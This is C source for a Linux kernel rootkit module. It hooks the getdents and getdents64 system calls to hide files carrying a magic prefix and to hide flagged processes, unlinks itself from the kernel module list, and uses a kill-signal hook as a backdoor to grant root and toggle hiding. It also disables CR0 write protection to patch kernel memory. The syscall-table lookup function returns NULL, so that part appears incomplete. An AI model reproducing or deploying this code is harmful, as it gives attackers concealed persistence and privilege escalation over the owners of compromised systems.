#define KPROBE_LOOKUP 1
#define MAGIC_PREFIX "dkom_rootkit_secret"
#define PF_INVISIBLE 0x10000000


///////////////////////////////
//    Check system options
///////////////////////////////
#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif

#ifndef __NR_getdents
#define __NR_getdents 141
#endif


///////////////////////////////
//   Define structs
///////////////////////////////
struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

static struct task_struct * find_task(pid_t pid) {
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

enum {
    SIGINVIS = 31,
    SIGSUPER = 64,
    SIGMODINVIS = 63,
};


static inline void tidy(void) {
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}


///////////////////////////////
//         Hide module 
///////////////////////////////
void module_show(void);
void module_hide(void);

static struct list_head *module_previous;
static short module_hidden = 0;

void module_show(void) {
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void module_hide(void) {
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

static int is_invisible(pid_t pid) {
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}


///////////////////////////////
// Give Root to module
///////////////////////////////
static void give_root(void) {
    struct cred *newcreds;
    newcreds = prepare_creds();

    if (newcreds == NULL)
        return;

    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;

    commit_creds(newcreds);
}


///////////////////////////////
//   kprobe init to hook
//     system calls
///////////////////////////////
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
unsigned long * get_syscall_table_bf(void);

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

unsigned long * get_syscall_table_bf(void) {
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

    return NULL;
}


///////////////////////////////
// getdent64 system call hook
///////////////////////////////
static t_syscall orig_getdents64;
asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs);

asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;

	int ret = orig_getdents64(pt_regs), err;

	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;


	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc &&
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}


///////////////////////////////
// getdent system call hook
///////////////////////////////
static t_syscall orig_getdents;
asmlinkage long hacked_getdents(const struct pt_regs *pt_regs);

asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {

	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;

	int ret = orig_getdents(pt_regs), err;

	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;


	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;


	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && 
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}


///////////////////////////////
// kill system call hook
///////////////////////////////
static t_syscall orig_kill;
asmlinkage int hacked_kill(const struct pt_regs *pt_regs);

asmlinkage int hacked_kill(const struct pt_regs *pt_regs) {
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;

	struct task_struct *task;
	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:

		return orig_kill(pt_regs);

	}
	return 0;
}


///////////////////////////////
//    Write to memory
///////////////////////////////
unsigned long cr0;

inline void write_cr0_forced(unsigned long val) {
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}


inline void protect_memory(void) {
	write_cr0_forced(cr0);
}


inline void unprotect_memory(void) {
	write_cr0_forced(cr0 & ~0x00010000);
}